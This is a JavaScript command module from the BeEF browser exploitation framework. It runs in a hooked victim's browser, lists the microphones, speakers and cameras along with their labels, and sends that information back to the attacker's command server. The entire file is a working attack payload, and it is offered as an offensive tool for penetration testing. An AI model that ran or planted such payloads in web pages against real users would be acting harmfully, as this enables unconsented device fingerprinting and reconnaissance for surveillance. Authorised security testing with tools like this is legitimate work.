//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function () {
    if (typeof navigator.mediaDevices === 'undefined' ||
        typeof navigator.mediaDevices.enumerateDevices !== 'function') {
        beef.net.send("<%= @command_url %>", <%= @command_id %>,
            "error=" + encodeURIComponent("API not available in this browser"),
            beef.status.error());
        return;
    }

    navigator.mediaDevices.enumerateDevices()
        .then(function (devices) {
            var result = {
                audioinput:  { count: 0, labels: [] },
                audiooutput: { count: 0, labels: [] },
                videoinput:  { count: 0, labels: [] }
            };
            devices.forEach(function (device) {
                if (result[device.kind]) {
                    result[device.kind].count++;
                    if (device.label) {
                        result[device.kind].labels.push(device.label);
                    }
                }
            });

            var body =
                "audioinput_count="    + result.audioinput.count +
                "&audioinput_labels="  + encodeURIComponent(result.audioinput.labels.join(", ")) +
                "&audiooutput_count="  + result.audiooutput.count +
                "&audiooutput_labels=" + encodeURIComponent(result.audiooutput.labels.join(", ")) +
                "&videoinput_count="   + result.videoinput.count +
                "&videoinput_labels="  + encodeURIComponent(result.videoinput.labels.join(", "));

            beef.net.send("<%= @command_url %>", <%= @command_id %>, body, beef.status.success());
        })
        .catch(function (err) {
            beef.net.send("<%= @command_url %>", <%= @command_id %>,
                "error=" + encodeURIComponent("Error: " + (err.message || String(err))),
                beef.status.error());
        });
});
